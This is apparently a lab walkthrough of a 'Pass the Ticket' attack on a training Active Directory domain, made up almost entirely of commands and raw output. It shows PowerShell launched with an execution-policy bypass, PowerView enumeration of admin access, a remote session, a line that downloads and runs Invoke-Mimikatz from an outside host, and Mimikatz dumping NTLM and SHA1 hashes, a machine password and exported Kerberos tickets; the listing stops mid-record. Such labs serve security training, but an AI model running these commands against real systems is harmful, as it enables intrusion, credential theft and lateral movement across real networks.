# Pass the Ticket

## Mimikatz
```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd
PS C:\Windows\system32> cd c:\
PS C:\> cd tools
PS C:\tools> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\tools> . .\PowerView.ps1
PS C:\tools> get-domain


Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local



PS C:\tools> find-localadminaccess
seclogs.research.SECURITY.local
client.research.SECURITY.local
PS C:\tools> whoami
research\student
PS C:\tools> hostname
client
PS C:\tools>
```

```
PS C:\tools> enter-pssession seclogs.research.security.local
[seclogs.research.security.local]: PS C:\Users\student\Documents> whoami
research\student
[seclogs.research.security.local]: PS C:\Users\student\Documents> hostname
seclogs
[seclogs.research.security.local]: PS C:\Users\student\Documents>

[seclogs.research.security.local]: PS C:\Users\student\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
[seclogs.research.security.local]: PS C:\Users\student\Documents>
```

```
[seclogs.research.security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
[seclogs.research.security.local]: PS C:\> . .\Invoke-Mimikatz.ps1
[seclogs.research.security.local]: PS C:\> Invoke-Mimikatz
Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
```

```
mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 169384 (00000000:000295a8)
Session           : Interactive from 1
User Name         : maintainer
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 11/1/2024 1:33:39 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1116
        msv :
         [00000003] Primary
         * Username : maintainer
         * Domain   : RESEARCH
         * NTLM     : cc3c6e624cd70893a3a98e7c4dee136c
         * SHA1     : 57ed62adad7f3f04fd33915b6383d63eae747bc1
         [00010000] CredentialKeys
         * NTLM     : cc3c6e624cd70893a3a98e7c4dee136c
         * SHA1     : 57ed62adad7f3f04fd33915b6383d63eae747bc1
        tspkg :
        wdigest :
         * Username : maintainer
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : maintainer
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 169338 (00000000:0002957a)
Session           : Interactive from 1
User Name         : maintainer
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 11/1/2024 1:33:39 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1116
        msv :
         [00000003] Primary
         * Username : maintainer
         * Domain   : RESEARCH
         * NTLM     : cc3c6e624cd70893a3a98e7c4dee136c
         * SHA1     : 57ed62adad7f3f04fd33915b6383d63eae747bc1
         [00010000] CredentialKeys
         * NTLM     : cc3c6e624cd70893a3a98e7c4dee136c
         * SHA1     : 57ed62adad7f3f04fd33915b6383d63eae747bc1
        tspkg :
        wdigest :
         * Username : maintainer
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : maintainer
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 41416 (00000000:0000a1c8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 6e893e85e373a3112b523c2c6588e9ff
         * SHA1     : b708f1a8ad6547875a495f3657c3b64aaef65429
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password : @sL)]H"E`Kn$ csuQ'TwigYVn]CuGZWD(BYONv5D&'Il'5I':xCUDvu@^eN'YK.:7M3Af`=Lj*-Uk2zru`,@I`?;HObOlN0$H'
VnweSKS 2]ywj bFrZv*R4
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 6e893e85e373a3112b523c2c6588e9ff
         * SHA1     : b708f1a8ad6547875a495f3657c3b64aaef65429
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21926 (00000000:000055a6)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               :
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 6e893e85e373a3112b523c2c6588e9ff
         * SHA1     : b708f1a8ad6547875a495f3657c3b64aaef65429
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 41373 (00000000:0000a19d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * NTLM     : 6e893e85e373a3112b523c2c6588e9ff
         * SHA1     : b708f1a8ad6547875a495f3657c3b64aaef65429
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password : @sL)]H"E`Kn$ csuQ'TwigYVn]CuGZWD(BYONv5D&'Il'5I':xCUDvu@^eN'YK.:7M3Af`=Lj*-Uk2zru`,@I`?;HObOlN0$H'
VnweSKS 2]ywj bFrZv*R4
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SECLOGS$
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!

[seclogs.research.security.local]: PS C:\>
```

```
[seclogs.research.security.local]: PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets export"'
Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::tickets export

Authentication Id : 0 ; 3551572 (00000000:00363154)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:53:38 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

         * Username : student
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:37:43 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03909179dd473ee510bf61ff5d1b0aaabb690001382bbc54a1643f615785bc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;363154]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 169384 (00000000:000295a8)
Session           : Interactive from 1
User Name         : maintainer
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 11/1/2024 1:33:39 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1116

         * Username : maintainer
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:34:27 PM ; 11/1/2024 11:33:41 PM ; 11/8/2024 1:33:41 PM
           Service Name (02) : ldap ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : ldap ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : maintainer ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             bfac6abb1c7c62b48e7259e7fd85167e2b009e7bb39e563ca8b5132ffaf56cdc
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;295a8]-0-0-40a50000-maintainer@ldap-prod.research.SECURITY.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/1/2024 1:33:41 PM ; 11/1/2024 11:33:41 PM ; 11/8/2024 1:33:41 PM
           Service Name (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Target Name  (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Client Name  (01) : maintainer ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b0aef55037675da657abff979ea24b7a0746bee55f6c81017403d2038501b5d0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;295a8]-0-1-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:33:41 PM ; 11/1/2024 11:33:41 PM ; 11/8/2024 1:33:41 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : maintainer ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c999ed540ca26ae440e3b10d87fba6d29634989de4218fdb761c2cd0ae1b6e10
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;295a8]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 169338 (00000000:0002957a)
Session           : Interactive from 1
User Name         : maintainer
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 11/1/2024 1:33:39 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1116

         * Username : maintainer
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:34:03 PM ; 11/1/2024 11:33:39 PM ; 11/8/2024 1:33:39 PM
           Service Name (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Target Name  (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Client Name  (01) : maintainer ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             13af1f39b99919bf8e91aad11f2fdd392ef2ca17c9c8ef56a9318ab4db671ee2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;2957a]-0-0-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:33:39 PM ; 11/1/2024 11:33:39 PM ; 11/8/2024 1:33:39 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : krbtgt ; research ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : maintainer ; @ RESEARCH.SECURITY.LOCAL ( research )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             dacbf0e119d76d08dd665f29927968429ebdaa7533dd885c435e862c7274dc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 41416 (00000000:0000a1c8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-90-1

         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password : @sL)]H"E`Kn$ csuQ'TwigYVn]CuGZWD(BYONv5D&'Il'5I':xCUDvu@^eN'YK.:7M3Af`=Lj*-Uk2zru`,@I`?;HObOlN0$H'
VnweSKS 2]ywj bFrZv*R4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-20

         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:48:39 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : cifs ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : cifs ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b898857bf2e6681c794ffc6edcc12f3b761658b569dfb4292ba68e6ab9070531
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e4]-0-0-40a50000-SECLOGS$@cifs-prod.research.SECURITY.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : GC ; dc2012.SECURITY.local ; SECURITY.local ; @ SECURITY.LOCAL
           Target Name  (02) : GC ; dc2012.SECURITY.local ; SECURITY.local ; @ SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             166ac5df0eaa1fe2bcb3106358ca36a4164d7262aa106700cc14598d38d4183d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e4]-0-1-40a50000-SECLOGS$@GC-dc2012.SECURITY.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : ldap ; prod.research.security.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Target Name  (02) : ldap ; prod.research.security.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             48dd44ff189e86153608a4d38e8b6a6cb086b7a579176a3c74cf74170e084c17
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e4]-0-2-40a50000-SECLOGS$@ldap-prod.research.security.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:48:39 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             19dab54953efe17dc73a63fe5ffc820d2d8e8aa569e353278802a97eaf627bf8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-60a10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : krbtgt ; SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             92ca97dea4ae0cb87fe936558701f352
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 0        [...]
           * Saved to file [0;3e4]-2-1-40a50000-SECLOGS$@krbtgt-SECURITY.LOCAL.kirbi !
         [00000002]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : krbtgt ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL ( research.SECURITY.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b69147800d719f8af5daf6e029c76392c4fea1709d821e1a6aca81ef25c7713c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-2-40e10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 3551358 (00000000:0036307e)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:53:38 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

         * Username : student
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:37:43 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03909179dd473ee510bf61ff5d1b0aaabb690001382bbc54a1643f615785bc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;36307e]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 1558105 (00000000:0017c659)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:49:07 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

         * Username : student
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:37:43 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03909179dd473ee510bf61ff5d1b0aaabb690001382bbc54a1643f615785bc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;17c659]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 1547995 (00000000:00179edb)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:49:07 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

         * Username : student
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:37:43 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03909179dd473ee510bf61ff5d1b0aaabb690001382bbc54a1643f615785bc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;179edb]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 1394982 (00000000:00154926)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:49:00 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

         * Username : student
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:49:00 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Target Name  (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 60a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwarded ; forwardable ;

           Session Key       : 0x00000012 - aes256_hmac
             d53cca60761371c30f4f70c8d685d18c4a75b6377f9ad05c778bf8ea6d7cc0ab
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;154926]-0-0-60a50000-student@LDAP-prod.research.SECURITY.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:37:43 PM ; 11/1/2024 11:35:26 PM ; 11/8/2024 1:35:26 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (--) : @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : student ; @ RESEARCH.SECURITY.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             03909179dd473ee510bf61ff5d1b0aaabb690001382bbc54a1643f615785bc52
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;154926]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 41373 (00000000:0000a19d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-90-1

         * Username : SECLOGS$
         * Domain   : research.SECURITY.local
         * Password : @sL)]H"E`Kn$ csuQ'TwigYVn]CuGZWD(BYONv5D&'Il'5I':xCUDvu@^eN'YK.:7M3Af`=Lj*-Uk2zru`,@I`?;HObOlN0$H'
VnweSKS 2]ywj bFrZv*R4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SECLOGS$
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 11/1/2024 1:33:20 PM
SID               : S-1-5-18

         * Username : seclogs$
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:33:23 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
